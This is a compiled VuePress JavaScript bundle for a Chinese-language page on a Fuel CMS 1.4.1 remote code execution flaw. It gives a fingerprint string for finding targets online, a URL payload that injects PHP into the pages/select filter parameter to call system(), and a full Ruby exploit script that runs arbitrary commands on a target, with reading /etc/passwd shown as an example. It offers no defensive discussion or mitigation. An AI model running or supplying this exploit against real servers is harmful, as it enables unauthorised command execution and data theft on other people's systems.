import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as t,c as a,a as e,b as n,d as s,e as r}from"./app-58e4a7d6.js";const c={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),o=e("p",null,"参考链接：",-1),v={href:"https://github.com/nahi/httpclient/issues/242",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.exploit-db.com/exploits/49487",target:"_blank",rel:"noopener noreferrer"},b=r(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;Fuel CMS&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/fuel/pages/select/?filter=&#39;%2Bpi(print(%24a%3D&#39;system&#39;))%2B%24a(&#39;#{cmd}&#39;)%2B&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#!/usr/bin/env ruby

require &#39;httpclient&#39;
require &#39;docopt&#39;

# dirty workaround to ignore Max-Age
# https://github.com/nahi/httpclient/issues/242#issuecomment-69013932
$VERBOSE = nil

doc = &lt;&lt;~DOCOPT
  Fuel CMS 1.4 - Remote Code Execution

  Usage:
    #{__FILE__} &lt;url&gt; &lt;cmd&gt;
    #{__FILE__} -h | --help

  Options:
    &lt;url&gt;         Root URL (base path) including HTTP scheme, port and root folder
    &lt;cmd&gt;         The system command to execute
    -h, --help    Show this screen

  Examples:
    #{__FILE__} http://example.org id
    #{__FILE__} https://example.org:8443/fuelcms &#39;cat /etc/passwd&#39;
DOCOPT

def exploit(client, root_url, cmd)
  url = root_url + &quot;/fuel/pages/select/?filter=&#39;%2Bpi(print(%24a%3D&#39;system&#39;))%2B%24a(&#39;#{cmd}&#39;)%2B&#39;&quot;

  res = client.get(url)

  /system(.+?)&lt;div/mx.match(res.body).captures[0].chomp
end

begin
  args = Docopt.docopt(doc)
  clnt = HTTPClient.new
  puts exploit(clnt, args[&#39;&lt;url&gt;&#39;], args[&#39;&lt;cmd&gt;&#39;])
rescue Docopt::Exit =&gt; e
  puts e.message
end
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function p(h,_){const i=d("ExternalLinkIcon");return t(),a("div",null,[u,o,e("ul",null,[e("li",null,[e("a",v,[n("https://github.com/nahi/httpclient/issues/242"),s(i)])]),e("li",null,[e("a",m,[n("https://www.exploit-db.com/exploits/49487"),s(i)])])]),b])}const f=l(c,[["render",p],["__file","Fuel CMS 1.4.1 远程代码执行漏洞.html.vue"]]);export{f as default};
